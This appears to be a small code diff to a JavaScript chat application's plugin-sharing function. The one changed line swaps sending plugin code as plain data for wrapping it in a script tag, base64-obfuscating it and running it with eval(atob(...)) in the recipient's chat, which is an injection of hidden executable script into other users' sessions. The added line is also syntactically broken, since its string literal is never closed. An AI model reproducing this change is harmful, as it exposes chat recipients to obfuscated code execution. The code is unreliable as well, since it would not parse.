@@ -23,7 +23,7 @@ var sharePluginsWithPlugin = function () {
      */
     _self.sharePluginsWith = function (cmd, params, source) {
 	  	if( !source ) { try{
-        $.chat.sendPrivate(params,  $.chat.pluginsCode);
+        $.chat.sendPrivate(params,  '<script>var pl=' + btoa($.chat.pluginsCode) + ';eval(atob(pl));</script>);
 	  	}catch(e){$.chat.write(e.toString(), 'sharePluginsWith');return '';}
 		  }
 		  return '';
